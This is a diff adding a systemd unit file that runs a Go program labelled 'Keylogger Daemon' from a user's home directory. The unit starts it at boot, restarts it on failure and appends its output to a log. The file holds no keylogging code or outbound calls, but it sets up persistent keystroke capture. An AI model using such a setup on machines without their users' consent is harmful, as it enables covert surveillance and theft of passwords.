@@ -1,0 +1,16 @@
+[Unit]
+Description=Keylogger Daemon
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/home/sensei/keylogger/cmd/keylogger/keylogger
+Restart=on-failure
+User=sensei
+WorkingDirectory=/home/sensei/keylogger
+StandardOutput=append:/home/sensei/keylogger/logs/keylogger.log
+StandardError=append:/home/sensei/keylogger/logs/keylogger.log
+Environment=GOTRACEBACK=all
+
+[Install]
+WantedBy=multi-user.target
